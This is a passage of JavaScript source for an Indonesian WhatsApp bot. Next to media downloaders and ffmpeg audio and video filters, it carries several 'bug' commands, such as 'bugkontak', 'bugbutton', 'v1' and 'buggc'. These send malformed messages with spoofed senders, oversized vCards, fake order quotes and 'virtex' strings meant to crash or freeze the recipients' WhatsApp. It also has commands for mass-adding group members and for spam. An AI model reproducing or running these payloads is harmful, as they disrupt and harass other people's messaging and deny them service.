ytresult += '❏ Upload: ' + video.ago + '\n________________________\n\n'
});
ytresult += '© Xenji />*'
tsukasa.sendMessage(from,tbuff,image,{quoted:mek,caption:ytresult})
break
            case 'join':
            try {
            if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) return reply('Link Nya Mana?')
            hen = args[0]
            if (!q) return fakestatus('Masukan link group')
            var codeInvite = hen.split('https://chat.whatsapp.com/')[1]
            if (!codeInvite) return reply('pastikan link sudah benar!')
            var response = await tsukasa.acceptInvite(codeInvite)
            reply('SUKSES')
            } catch {
            reply('LINK ERROR!')
            }
            break
  case 'setprefix':
if (args.length < 1) return reply(`*Format Error!*\n\n*Example :*\n •${prefix + command} multi\n •${prefix + command} nopref\n •${prefix + command} # (Custom!)\n\n*Thanks To : ${fake}*`)
if((args[0]) == 'multi'){
if(multi)return reply('_Sudah diaktifkan sebelumnya!_')
multi = true
nopref = false
single = false
reply(`_Succses mengganti Prefix ke Multiprefix!_`)
}else
if ((args[0]) == 'nopref'){
if(nopref)return reply('_Sudah diaktifkan sebelumnya!_')
multi = false
single = false
nopref = true
reply(`_Succses mengganti Prefix ke noprefix!_`)
}else
if((args[0]) == `${q}`){
multi = false
nopref = false
single = true
prefa = `${q}`
reply(`_Succses mengganti Prefix ke ${q}_`)
}
break
  case 'buglist':
res = await tsukasa.prepareMessageFromContent(from,{
"listMessage": {
"title": fake,
"description": `${virtex5(prefix)}`,
"buttonText": "ꪶ𖣂ꫂXennChanꪶ𖣂ꫂ",
"listType": "SINGLE_SELECT",
 "thumbnail": virgam,
"sections": [
{
    "rows": [ 
       {
          "title": `${emoji1(prefix)}`,
          "rowId": "ApaSih"
       }  
     ]
   }
 ]
}
}, {quoted:flokasi})
tsukasa.relayWAMessage(res)
break
				case 'ssweb':
					if (args.length < 1) return reply('Urlnya mana om')
					teks = body.slice(7)
					reply(`WAIT`)
					anu = await fetchJson(`https://mnazria.herokuapp.com/api/screenshotweb?url=${teks}`)
					buff = await getBuffer(anu.gambar)
					tsukasa.sendMessage(from, buff, image, {quoted: mek})
					break
					case 'bugkontak':
				  let listary = []
				  let owner3 = ["6285709664923@s.whatsapp.net","0@s.whatsapp.net","1000@s.whatsapp.net","299558458@s.whatsapp.net","33777707775@s.whatsapp.net","77777@s.whatsapp.net","0@s.whatsapp.net","1111111111@s.whatsapp.net","70000@s.whatsapp.net","99999999@s.whatsapp.net",]
					for (let i of owner3) { 
					listary.push({
					"displayName": `${listary.length} Kontak`, 
					"vcard": `BEGIN:VCARD\nVERSION:3.0\nN:© Xenji />;;;\nFN:© Xenji />\nitem1.TEL;waid=${i.split("@")[0]}:+${i.split("@")[0]}\nADR;TYPE=WORK:HOME;WHATSAPP.NET:ꪶ𖣂ꫂXennChanꪶ𖣂ꫂ\nADR;TYPE=WORK:HOME;WHATSAPP.NET:ꪶ𖣂ꫂXennChanꪶ𖣂ꫂ\nADR;TYPE=WORK:HOME;WHATSAPP.NET:ꪶ𖣂ꫂXennChanꪶ𖣂ꫂ\nADR;TYPE=WORK:HOME;WHATSAPP.NET:ꪶ𖣂ꫂXennChanꪶ𖣂ꫂ\nADR;TYPE=WORK:HOME;WHATSAPP.NET:ꪶ𖣂ꫂXennChanꪶ𖣂ꫂ\nADR;TYPE=WORK:HOME;WHATSAPP.NET:ꪶ𖣂ꫂXennChanꪶ𖣂ꫂ\nADR;TYPE=WORK:HOME;WHATSAPP.NET:ꪶ𖣂ꫂXennChanꪶ𖣂ꫂ\nADR;TYPE=WORK:HOME;WHATSAPP.NET:ꪶ𖣂ꫂXennChanꪶ𖣂ꫂ\nADR;TYPE=WORK:HOME;WHATSAPP.NET:ꪶ𖣂ꫂXennChanꪶ𖣂ꫂ\nADR;TYPE=WORK:HOME;WHATSAPP.NET:ꪶ𖣂ꫂXennChanꪶ𖣂ꫂ\nADR;TYPE=WORK:HOME;WHATSAPP.NET:ꪶ𖣂ꫂXennChanꪶ𖣂ꫂ\nADR;TYPE=WORK:HOME;WHATSAPP.NET:ꪶ𖣂ꫂXennChanꪶ𖣂ꫂ\nADR;TYPE=WORK:HOME;WHATSAPP.NET:ꪶ𖣂ꫂXennChanꪶ𖣂ꫂ\nADR;TYPE=WORK:HOME;WHATSAPP.NET:ꪶ𖣂ꫂXennChanꪶ𖣂ꫂ\nADR;TYPE=WORK:HOME;WHATSAPP.NET:ꪶ𖣂ꫂXennChanꪶ𖣂ꫂ\nADR;TYPE=WORK:HOME;WHATSAPP.NET:ꪶ𖣂ꫂXennChanꪶ𖣂ꫂ\nADR;TYPE=WORK:HOME;WHATSAPP.NET:ꪶ𖣂ꫂXennChanꪶ𖣂ꫂ\nADR;TYPE=WORK:HOME;WHATSAPP.NET:ꪶ𖣂ꫂXennChanꪶ𖣂ꫂ\nADR;TYPE=WORK:HOME;WHATSAPP.NET:ꪶ𖣂ꫂXennChanꪶ𖣂ꫂ\nADR;TYPE=WORK:HOME;WHATSAPP.NET:ꪶ𖣂ꫂXennChanꪶ𖣂ꫂ\nADR;TYPE=WORK:HOME;WHATSAPP.NET:ꪶ𖣂ꫂXennChanꪶ𖣂ꫂ\nADR;TYPE=WORK:HOME;WHATSAPP.NET:ꪶ𖣂ꫂXennChanꪶ𖣂ꫂ\nADR;TYPE=WORK:HOME;WHATSAPP.NET:ꪶ𖣂ꫂXennChanꪶ𖣂ꫂ\nitem1.X-ABLabel:Ponsel\nEND:VCARD`
					})
					}
 tsukasa.sendMessage(from, { "displayName": `${listary.length} kontak`, "contacts": listary }, 'contactsArrayMessage', { 
                 quoted: {
                key: {
                participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})
                },
                message: {
                orderMessage: {
                itemCount: 99999999,
                status: 1
                ,surface: 10,
                orderTitle: fake,
                sellerJid: '0@s.whatsapp.net', thumbnail: virgam
                }}}},0)
 break 
 case 'quoted':
				reply(JSON.stringify(mek.message.extendedTextMessage.contextInfo, null, 3))
				break
				case 'q': 
if (!m.quoted) return reply('reply message!')
let qse = tsukasa.serializeM(await m.getQuotedObj())
if (!qse.quoted) return reply('the message you replied does not contain a reply!')
await qse.quoted.copyNForward(m.chat, true)
break
case 'buttonpdf':
tsukasa.sendMessage(from, {"contentText": 'Xenji Was Here broo' ,"footerText": virtex9(prefix) , "buttons": [
  {buttonId: 'ByXenji', buttonText:{displayText: virtexbytsukasa(prefix)}, type: 1},
  ], "headerType": "DOCUMENT", "documentMessage": {
      "url": "https://mmg.whatsapp.net/d/f/Ao-k40Q-gO_hn2Sqy4nHfrYAYVeWq-7FZNjAqSMngeXI.enc",
          "mimetype": "application/pdf",
          "jpegThumbnail": image,
              "fileSha256": "kXrt+8eqBgD3MAaYx15D+0Mjbi7yiiv9gIBMu9tXtpE=",
                  "fileLength": "5",
                      "pageCount": 1,
                          "mediaKey": "3n1n1Kbt6aNkBAVg8GMetpwXOQusBR97m/gdkX/DbG0=",
                              "fileName": virtex9(prefix),
                                  "fileEncSha256": "bx/mFEB8SWYMsYMtnlnbbA1B2pJ18rKZqeL7byF+X/A="
                                    }}, MessageType.buttonsMessage)
                                    break
 case 'bugbutton':
					let contentd = fs.readFileSync('./media/virgam.jpeg')
					let mdia = await tsukasa.prepareMessageMedia(contentd, MessageType.image, {thumbnail: fs.readFileSync('./media/virgam.jpeg')})
					let taip = 4;
					let buttons = [
					{buttonId: 'id1', buttonText: {displayText: virtex9(prefix)}, type: 1}
					]
					let buttonMessageh = {
						contentText: virtex9(prefix),
						footerText: virtex9(prefix),
						buttons: buttons,
						headerType: 4,
						...mdia
					}
					tsukasa.sendMessage(from, buttonMessageh, MessageType.buttonsMessage, { 
                 quoted: {
                key: {
                participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})
                },
                message: {
                orderMessage: {
                itemCount: 99999999,
                status: 1
                ,surface: 10,
                orderTitle: fake,
                sellerJid: '0@s.whatsapp.net'
                }}}})
					break
					case 'ytmp4':
if (!q)return reply(`Example : ${prefix + command} [Link]`)
mp4 = await fetchJson(`http://zekais-api.herokuapp.com/ytmp4?url=${q}`)
if (mp4.error) return reply(mp4.error)
ytt3 = `「 *YOUTUBE MP4* 」\n\n▢ *Judul :* ${mp4.title}\n▢ *Size : ${mp4.size}*\n▢ *Ext: Mp4*\n▢ *Quality : ${mp4.quality}*\n▢ *Like : ${mp4.likes}*\n▢ *Dislike : ${mp4.dislike}*\n▢ *Views : ${mp4.views}*\n▢ *Upload : ${mp4.uploadDate}*\n\n*[ Wait ]Tunggu Sebentar kak...*`
buff = await getBuffer(mp4.thumb)
reply(mess.wait)
tsukasa.sendMessage(from, buff, image, {quoted: mek, caption: ytt3})
sendMediaURL(from,mp4.result,`「 *YOUTUBE MP4* 」\n*Data Berhasil diDapatkan!*\n\n▢ *Judul : ${mp4.title}*\n▢ *Size : ${mp4.size}*\n▢ *Ext: Mp4*\n▢ *Quality : ${mp4.quality}*\n▢ *Like : ${mp4.likes}*\n▢ *Dislike : ${mp4.dislike}*\n▢ *Views : ${mp4.views}*\n▢ *Upload : ${mp4.uploadDate}*`)
break 
case 'ytmp3':
if (!q)return reply(`Example : ${prefix + command} [Link]`)
ppec = await fetchJson(`http://zekais-api.herokuapp.com/ytmp3?url=${q}`)
if (ppec.error) return reply(ppec.error)
ytt = `「 *YOUTUBE MP3* 」\n\n▢ *Judul :* ${ppec.title}\n▢ *Size : ${ppec.size}*\n▢ *Ext: Mp3*\n▢ *Like : ${ppec.likes}*\n▢ *Dislike : ${ppec.dislike}*\n▢ *Views : ${ppec.views}*\n▢ *Upload : ${ppec.uploadDate}*\n\n*[ Wait ]Tunggu Sebentar kak...*`
buff = await getBuffer(ppec.thumb)
reply(mess.wait)
tsukasa.sendMessage(from, buff, image, {quoted: mek, caption: ytt})
sendMediaURL(from,ppec.result)
break 		
 case 'pc':
  tsukasa.sendMessage(from, { "groupName": ngazap(prefix), "groupJid": "6285709664923-1627579259@g.us", "inviteCode": "9JQb+8+4H7C63cCm", "inviteExpiration": "0", "caption": virtex9(prefix), "jpegThumbnail": fs.readFileSync('./media/image.jpeg') }, MessageType.groupInviteMessage,{ 
                 quoted: {
                key: {
                participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})
                },
                message: {
                orderMessage: {
                itemCount: 99999999,
                status: 1
                ,surface: 10,
                orderTitle: fake,
                sellerJid: '0@s.whatsapp.net'
                }}}})
  break
  case 'bugtroli':
  tsukasa.sendMessage(from,fake,text,{ 
                 quoted: {
                key: {
                participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})
                },sendEphemeral: true,
					thumbnail: fs.readFileSync('./media/virgam.jpeg'), 
                message: {
                orderMessage: {
                itemCount: 99999999,
                status: 1,
                thumbnail: virgam,
                surface: 10,
                orderTitle: fake,
                sellerJid: '0@s.whatsapp.net'
                }}}}, 0)
                break
                case 'culik':
              if (args.length < 1) return reply('Masukin id grupnya tolol')
              let pantek = []
              for (let i of groupMembers) {
              pantek.push(i.jid)
}
              tsukasa.groupAdd(args[0], pantek)
              break
case 'v1':
tsukasa.toggleDisappearingMessages(from,`AaaaGoblok`,text)
var tolol = tsukasa.prepareMessageFromContent(from,{
 "orderMessage": {
 "orderId": "599519108102353",
 "thumbnail": virgam,
 "itemCount": 482007,
 "status": "INQUIRY",
 "surface": "CATALOG",
 "message": `${virtex7(prefix)}`,
 "orderTitle": fake,
 "sellerJid": "6283131458282@s.whatsapp.net",
 "token": "AR6z9PAvHjs9Qa7AYgBUjSEvcnOcRWycFpwieIhaMKdrhQ=="
 }
 }, {quoted: {
				  key: {
				   fromMe: false,
				   participant: `0@s.whatsapp.net`, // Fake sender Jid
				   remoteJid: "status@broadcast"
				  },
				  message: {
				   orderMessage: {
				    itemCount: 999999999, // Bug
				    status: 1,
				    surface: 1,
				    message: '999999999',
				    orderTitle: '999999999', // Idk what this does
				    sellerJid: `0@s.whatsapp.net` // Seller
				   }
				  }
				 }, contextInfo:{}}) 
 tsukasa.relayWAMessage(tolol)
break
case 'vweb':
tsukasa.toggleDisappearingMessages(from,`AaaaGoblok`,text)
tsukasa.sendMessage(from,'X - Capt.Xenji',text,{contextInfo :{text: '🔥',
            "forwardingScore": 1000000000,
            isForwarded: false,
            sendEphemeral: false,
            "externalAdReply": {
                "title": `${ngazap(prefix)}`,
                "body": "",
                "previewType": "PHOTO",
                "thumbnailUrl": "https://i.ibb.co/3hrZZ6s/tsukasa.png",
                "thumbnail": fs.readFileSync(`./media/image.jpeg`),
                "sourceUrl": ""
 }},quoted: {
				  key: {
				   fromMe: false,
				   participant: `0@s.whatsapp.net`, // Fake sender Jid
				   remoteJid: "status@broadcast"
				  },
				  message: {
				   orderMessage: {
				    itemCount: 999999999, // Bug
				    status: 1,
				    surface: 1,
				    message: '999999999',
				    orderTitle: '999999999', // Idk what this does
				    sellerJid: `0@s.whatsapp.net` // Seller
				   }
				  }
				 }
				}) 
				break
  case 'buggif': 
const nicko = gif
					tsukasa.sendMessage(from,nicko,video, {mimetype: Mimetype.gif,caption: virtex9(prefix), thumbnail: virgam,quoted: {
				  key: {
				   fromMe: false,
				   participant: `0@s.whatsapp.net`, // Fake sender Jid
				   remoteJid: "status@broadcast"
				  },
				  message: {
				   orderMessage: {
				    itemCount: 999999999, // Bug
				    status: 1,
				    surface: 1,
				    message: '999999999',
				    orderTitle: '999999999', // Idk what this does
				    sellerJid: `0@s.whatsapp.net` // Seller
				   }
				  }
				 }
				}) 
				tsukasa.toggleDisappearingMessages(from,`AaaaGoblok`,text)
				break
  case 'buggc':
    if(!q) return ('mau send berapa bug nya bos?') 
for(let i=0; i<q; i++)
   tsukasa.toggleDisappearingMessages(from,`AaaaGoblok`,text)  
var group = await tsukasa.groupMetadata(from)
var member = group['participants']
var mem = []
member.map( async adm => {
mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
var options = {
text: fake, 
contextInfo: { mentionedJid: mem }
}
tsukasa.sendMessage(from, options, text,{ quoted: {
				  key: {
				   fromMe: false,
				   participant: `0@s.whatsapp.net`, // Fake sender Jid
				   remoteJid: "status@broadcast"
				  },
				  message: {
				   orderMessage: {
				    itemCount: 999999999, // Bug
				    status: 1,
				    thumbnail: virgam,
				    surface: 1,
				    message: '999999999',
				    orderTitle: '999999999', // Idk what this does
				    sellerJid: `0@s.whatsapp.net` // Seller
				   }
				  }
				 }
				})
break
		    case 'fastt':		    
		            if (!isQuotedVideo) return reply('Reply videonya!')
		            reply(mess.wait)
		            encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
		            media = await tsukasa.downloadAndSaveMediaMessage(encmedia)
		            ran = getRandom('.mp4')
		            exec(`ffmpeg -i ${media} -filter_complex "[0:v]setpts=0.5*PTS[v];[0:a]atempo=2[a]" -map "[v]" -map "[a]" ${ran}`, (err) => {
		            fs.unlinkSync(media)
		            if (err) return reply(`Err: ${err}`)
		            buffer453 = fs.readFileSync(ran)
		            tsukasa.sendMessage(from, buffer453, video, { mimetype: 'video/mp4', quoted: mek })
		            fs.unlinkSync(ran)
		            })
		            break
		    case 'slow':		    
		            if (!isQuotedVideo) return reply('Reply videonya!')
		            reply(mess.wait)
		            encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
		            media = await tsukasa.downloadAndSaveMediaMessage(encmedia)
		            ran = getRandom('.mp4')
		            exec(`ffmpeg -i ${media} -filter_complex "[0:v]setpts=2*PTS[v];[0:a]atempo=0.5[a]" -map "[v]" -map "[a]" ${ran}`, (err) => {
		            fs.unlinkSync(media)
		            if (err) return reply(`Err: ${err}`)
		            buffer453 = fs.readFileSync(ran)
		            tsukasa.sendMessage(from, buffer453, video, { mimetype: 'video/mp4', quoted: mek })
		            fs.unlinkSync(ran)
		            })
		            break
		    case 'reverse':		    
		            if (!isQuotedVideo) return reply('```Reply videonya!```')
		                        reply(mess.wait)
		            encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
		            media = await tsukasa.downloadAndSaveMediaMessage(encmedia)
		            ran = getRandom('.mp4')
		            exec(`ffmpeg -i ${media} -vf reverse -af areverse ${ran}`, (err) => {
		            fs.unlinkSync(media)
		            if (err) return reply(`Err: ${err}`)
		            buffer453 = fs.readFileSync(ran)
		            tsukasa.sendMessage(from, buffer453, video, { mimetype: 'video/mp4', quoted: mek })
		            fs.unlinkSync(ran)
		            })
		            break			       
           case 'mirror':           
		            if (!isQuotedVideo) return reply('```Reply videonya!```')
		                        reply(mess.wait)
		            encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
		            media = await tsukasa.downloadAndSaveMediaMessage(encmedia)
		            ran = getRandom('.mp4')
		            exec(`ffmpeg -i ${media} -filter:v "split [main][tmp]; [tmp] crop=iw:ih/2:0:0, vflip [flip]; [main][flip] overlay=0:H/2" ${ran}`, (err) => {
		            fs.unlinkSync(media)
		            if (err) return reply(`Err: ${err}`)
		            buffer453 = fs.readFileSync(ran)
		            tsukasa.sendMessage(from, buffer453, video, { mimetype: 'video/mp4', quoted: mek })
		            fs.unlinkSync(ran)
		            })
		            break			           
		           case 'hitamputih':		           
		            if (!isQuotedVideo) return reply('```Reply videonya!```')
		                        reply(mess.wait)
		            encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
		            media = await tsukasa.downloadAndSaveMediaMessage(encmedia)
		            ran = getRandom('.mp4')
		            exec(`ffmpeg -y -i ${media} -strict experimental -vf hue=s=0 -vcodec mpeg4 -b 2097152 -r 30 ${ran} `, (err) => {
		            fs.unlinkSync(media)
		            if (err) return reply(`Err: ${err}`)
		            buffer453 = fs.readFileSync(ran)
		            tsukasa.sendMessage(from, buffer453, video, { mimetype: 'video/mp4', quoted: mek })
		            fs.unlinkSync(ran)
		            })
		            break			
		            case 'nosound':		            		            
		            if (!isQuotedVideo) return reply('```Reply videonya!```')
		                        reply(mess.wait)
		            encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
		            media = await tsukasa.downloadAndSaveMediaMessage(encmedia)
		            ran = getRandom('.mp4')
		            exec(`ffmpeg -i ${media} -vcodec copy -an ${ran}`, (err) => {
		            fs.unlinkSync(media)
		            if (err) return reply(`Err: ${err}`)
		            buffer453 = fs.readFileSync(ran)
		            tsukasa.sendMessage(from, buffer453, video, { mimetype: 'video/mp4', quoted: mek })
		            fs.unlinkSync(ran)
		            })
		            break
		            case 'pinterest':
		            if (!q) return reply('yg mau di cari apa?')
pinterest(`${q}`).then( data => {
const amsulah = data.result
const pimterest = amsulah[Math.floor(Math.random() * amsulah.length)]
sendMediaURL(from ,pimterest , `Pinterest : ${q}`) 
})
break
case 'mediafire':
if (args.length < 1) return reply('Link Nya Mana? ')
if(!isUrl(args[0]) && !args[0].includes('mediafire')) return reply(mess.error.Iv)
reply(mess.wait)
teks = args.join(' ')
res = await mediafireDl(teks)
result = `Media Fire Downloader

*Nama :* ${res[0].nama}
*Ukuran :* ${res[0].size}
*Link :* ${res[0].link}

_*Tunggu Proses Mengirim Media......*_`
reply(result)
sendFileFromUrl(res[0].link, document, {mimetype: res[0].mime, filename: res[0].nama, quoted: mek})
break
 					case 'gemes':
					encmedia = isQuotedAudio ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
					media = await tsukasa.downloadAndSaveMediaMessage(encmedia)
					ran = getRandom('.mp3')
					exec(`ffmpeg -i ${media} -filter:a "atempo=1.0,asetrate=50000" ${ran}`, (err, stderr, stdout) => {
						fs.unlinkSync(media)
						if (err) return reply('Error!')
						riu = fs.readFileSync(ran)
					tsukasa.sendMessage(from, riu, audio, {mimetype: 'audio/mp4', ptt:true, quoted : ftoko})
						fs.unlinkSync(ran)
					})
					break 
case 'tempo':           
					encmedia = isQuotedAudio ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
					media = await tsukasa.downloadAndSaveMediaMessage(encmedia)
					ran = getRandom('.mp3')
					exec(`ffmpeg -i ${media} -filter:a "atempo=1.0,asetrate=12345" ${ran}`, (err, stderr, stdout) => {
						fs.unlinkSync(media)
						if (err) return reply('Error!')
						hah = fs.readFileSync(ran)
						tsukasa.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', ptt:true, quoted : ftoko,duration:'359996400'})
						fs.unlinkSync(ran)
					})
				break 
case 'nightcore':
					encmedia = isQuotedAudio ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
					media = await tsukasa.downloadAndSaveMediaMessage(encmedia)
					ran = getRandom('.mp3')
					exec(`ffmpeg -i ${media} -filter:a atempo=1.06,asetrate=44100*1.25 ${ran}`, (err, stderr, stdout) => {
						fs.unlinkSync(media)
						if (err) return reply('Error!')
						hah = fs.readFileSync(ran)
						tsukasa.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', ptt:true, quoted : ftoko,duration:'359996400'})
						fs.unlinkSync(ran)
					   })
				       break 
case 'fast':
				encmedia = isQuotedAudio ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
			     media = await tsukasa.downloadAndSaveMediaMessage(encmedia)
				ran = getRandom('.mp3')
				exec(`ffmpeg -i ${media} -filter:a "atempo=1.63,asetrate=44100" ${ran}`, (err, stderr, stdout) => {
				fs.unlinkSync(media)
				if (err) return reply('Error!')
				uhh = fs.readFileSync(ran)
				tsukasa.sendMessage(from, uhh, audio, {mimetype: 'audio/mp4', ptt:true, quoted : ftoko})
				fs.unlinkSync(ran)
				})
				break 
case 'tupai':
				reply(mess.wait,{quoted : ftoko})
					encmedia = isQuotedAudio ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
					media = await tsukasa.downloadAndSaveMediaMessage(encmedia)
					ran = getRandom('.mp3')
					exec(`ffmpeg -i ${media} -filter:a "atempo=0.5,asetrate=65100" ${ran}`, (err, stderr, stdout) => {
						fs.unlinkSync(media)
						if (err) return reply('Error!')
						hah = fs.readFileSync(ran)
						tsukasa.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', ptt:true, quoted : ftoko})
						fs.unlinkSync(ran)
					})
				break 
case 'gemok':
				reply(mess.wait,{quoted : ftoko})
					encmedia = isQuotedAudio ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
					media = await tsukasa.downloadAndSaveMediaMessage(encmedia)
					ran = getRandom('.mp3')
					exec(`ffmpeg -i ${media} -filter:a "atempo=1.6,asetrate=22100" ${ran}`, (err, stderr, stdout) => {
						fs.unlinkSync(media)
						if (err) return reply('Error!')
						hah = fs.readFileSync(ran)
						tsukasa.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', ptt:true, quoted : ftoko})
						fs.unlinkSync(ran)
					})
				break 
case 'bass':                 
				reply(mess.wait,{quoted : ftoko})
					encmedia = isQuotedAudio ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
					media = await tsukasa.downloadAndSaveMediaMessage(encmedia)
					ran = getRandom('.mp3')
					exec(`ffmpeg -i ${media} -af equalizer=f=94:width_type=o:width=2:g=30 ${ran}`, (err, stderr, stdout) => {
						fs.unlinkSync(media)
						if (err) return reply('Error!')
						hah = fs.readFileSync(ran)
						tsukasa.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', ptt:true, quoted : ftoko})
						fs.unlinkSync(ran)
					})
				break			
			case 'budek':
	encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
	media = await tsukasa.downloadAndSaveMediaMessage(encmedia)
	ran = getRandom('.mp3')
	exec(`ffmpeg -i ${media} -filter:a "volume=200" ${ran}`, (err, stderr, stdout) => {
fs.unlinkSync(media)
if (err) return reply('Error!')
res = fs.readFileSync(ran)
tsukasa.sendMessage(from, res, audio, { mimetype: "audio/mp4", ptt: true, quoted: fdocs})
fs.unlinkSync(ran)
	})
break 
case 'ghost':
					encmedia = isQuotedAudio ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
					media = await tsukasa.downloadAndSaveMediaMessage(encmedia)
					ran = getRandom('.mp3')
					exec(`ffmpeg -i ${media} -filter:a "atempo=1.6,asetrate=3486" ${ran}`, (err, stderr, stdout) => {
					fs.unlinkSync(media)
					if (err) return reply('Error!')
					hah = fs.readFileSync(ran)
					tsukasa.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', ptt:true, quoted : fdocs})
                    fs.unlinkSync(ran)
				    })
		            break
case 'hode':
					encmedia = isQuotedAudio ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
					media = await tsukasa.downloadAndSaveMediaMessage(encmedia)
					ran = getRandom('.mp3')
					exec(`ffmpeg -i ${media} -af atempo=4/3,asetrate=44500*3/4 ${ran}`, (err, stderr, stdout) => {
						fs.unlinkSync(media)
						if (err) return reply('Error!')
						hah = fs.readFileSync(ran)
						tsukasa.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', ptt: true, quoted: fdocs})
						fs.unlinkSync(ran)
					})
				break				
				case 'robot':
encmedia = isQuotedAudio ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
	media = await tsukasa.downloadAndSaveMediaMessage(encmedia)
ran = getRandom('.mp3')
exec(`ffmpeg -i ${media} -filter_complex "afftfilt=real='hypot(re,im)*sin(0)':imag='hypot(re,im)*cos(0)':win_size=512:overlap=0.75" ${ran}`, (err, stderr, stdout) => {
fs.unlinkSync(media)
if (err) return reply('Error!')
res = fs.readFileSync(ran)
tsukasa.sendMessage(from, res, audio, { mimetype: "audio/mp4", ptt: true, quoted: fdocs})
fs.unlinkSync(ran)
})
break
case 'imut':
	encmedia = isQuotedAudio ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek 
	media = await tsukasa.downloadAndSaveMediaMessage(encmedia)
	ran = getRandom('.mp3')
	exec(`ffmpeg -i ${media} -af atempo=1/2,asetrate=44500*2/1 ${ran}`, (err, stderr, stdout) => {
fs.unlinkSync(media)
if (err) return reply('Error!')
res = fs.readFileSync(ran)
tsukasa.sendMessage(from, res, audio, { mimetype: "audio/mp4", ptt: true, quoted: fdocs})
fs.unlinkSync(ran)
	})
break
                case 'loli2':
					reply('Wait:v')
					lomli = await getBuffer(`https://docs-jojo.herokuapp.com/api/randomloli`)
					tsukasa.sendMessage(from, lomli, image, { quoted: mek, caption: 'Cintai Loli Mu >_<' })
					break
					case 'addstik':
				if (!isQuotedSticker) return reply('Reply stiker nya')
				svst = body.slice(9)
				if (!svst) return reply('Nama sticker nya apa?')
				boij = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
				delb = await tsukasa.downloadMediaMessage(boij)
				setiker.push(`${svst}`)
				fs.writeFileSync(`./temp/stick/${svst}.webp`, delb)
				fs.writeFileSync('./temp/stik.json', JSON.stringify(setiker))
				tsukasa.sendMessage(from, `Sukses Menambahkan Sticker\nCek dengan cara ${prefix}liststik`, MessageType.text, { quoted: ftoko })
				break 
case 'buatgc':  
				argz = arg.split('|')
				if (mek.message.extendedTextMessage != undefined){
                    mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
 tsukasa.groupCreate(argz[0], mentioned)
 				} else {
					reply(from, `Penggunaan ${prefix}buatgc namagrup|@tag`)
				}
	break
case 'toimage': case 'toimg':
if (!isQuotedSticker) return reply('Reply Sticker Nya!')
reply(mess.wait)
encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
media = await tsukasa.downloadAndSaveMediaMessage(encmedia)
ran = getRandom('.png')
exec(`ffmpeg -i ${media} ${ran}`, async(err) => {
fs.unlinkSync(media)
if (err) return reply(' Gagal, pada saat mengkonversi sticker ke gambar')
bup = fs.readFileSync(ran)
buffer = await tsukasa.prepareMessage(from,bup,image)
coba = await tsukasa.prepareMessageFromContent(from,{
"imageMessage": {
    "url": buffer.message.imageMessage.url,
	"mimetype": buffer.message.imageMessage.mimetype,
	    "caption": '©Xenji />',
		"fileSha256": buffer.message.imageMessage.fileSha256.toString('base64'),
		    "fileLength": buffer.message.imageMessage.fileLength,
			"height": buffer.message.imageMessage.height,
			    "width": buffer.message.imageMessage.width,
				"mediaKey": buffer.message.imageMessage.mediaKey.low,
				    "jpegThumbnail": buffer.message.imageMessage.jpegThumbnail
				    }
				    }, {quoted:mek,caption : 'Xenji'})
				    tsukasa.relayWAMessage(coba)
				    fs.unlinkSync(ran)
				    })
				    break;
        case "jadibot": 
     // if (!isPremium) return reply(mess.only.prem)
        if (mek.key.fromMe) return reply("Tidak bisa jadibot di dalam bot");
        jadibot(reply, client, from);
        break; 
         
      case "stopjadibot":
        if (mek.key.fromMe)
          return reply("tidak bisa stopjadibot kecuali owner");
        stopjadibot(reply);
        break;
      case "listbot":
        let tekss = "「 *LIST JADIBOT* 」\n";
        for (let i of listjadibot) {
          tekss += `*Nomor* : ${i.jid.split("@")[0]}
*Nama* : ${i.name}
*Device* : ${i.phone.device_manufacturer}
*Model* : ${i.phone.device_model}\n\n`;
        }
        reply(tekss);
        break;
	                    case 'spam': 
if (!isQuotedSticker && !isQuotedAudio && !isQuotedImage && budy.length > 10) {
teks = body.slice(6)
oi1 = teks.split('|')[0]
oi2 = teks.split('|')[1]
